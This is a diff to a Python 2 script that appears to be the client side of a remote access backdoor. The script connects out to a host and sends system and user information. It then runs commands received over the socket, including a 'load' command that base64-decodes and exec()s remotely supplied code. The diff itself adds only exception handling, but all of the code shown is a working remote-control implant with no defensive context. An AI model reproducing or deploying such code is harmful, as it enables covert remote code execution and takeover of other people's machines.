@@ -14,10 +14,13 @@ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((host, port))
 
 sysinfo = ""
-if os.name == "nt":
-    pass
-else:
-    sysinfo =  ",".join(os.uname()) + "," + os.getlogin()
+try:
+    if os.name == "nt":
+        pass
+    else:
+        sysinfo =  ",".join(os.uname()) + "," + os.getlogin()
+except Exception, e:
+    sysinfo = ",".join(os.uname()) + "," + "noprocess"
 
 def send_data(conn, data):
     length = str(len(data)).zfill(16)
@@ -50,26 +53,25 @@ commands = {
     "load" : load
 }
 
-send_data(s, sysinfo)
+try:
+    send_data(s, sysinfo)
 
-while 1:
-    data = recv_data(s)
-    command = data.split(" ")[0].lower()
-    result = ""
-    if command == "load":
-        parts = data.split(" ")
-        command_name = parts[1]
-        content = base64.b64decode(parts[2])
-        exec(content)
-        main = sys.modules[__name__]
-        func = getattr(main, "client_" + command_name)
-        commands[command_name] = func
-    elif not command in commands.keys():
-        command = "exec"
+    while 1:
+        data = recv_data(s)
+        command = data.split(" ")[0].lower()
+        result = ""
+        if command == "load":
+            parts = data.split(" ")
+            command_name = parts[1]
+            content = base64.b64decode(parts[2])
+            exec(content)
+            main = sys.modules[__name__]
+            func = getattr(main, "client_" + command_name)
+            commands[command_name] = func
+        elif not command in commands.keys():
+            command = "exec"
     
-    result = commands[command](data)
-    send_data(s, result)
-    
-        
-    
-
+        result = commands[command](data)
+        send_data(s, result)
+except Exception, ex:
+    send_data(s, "Error: " + str(ex))
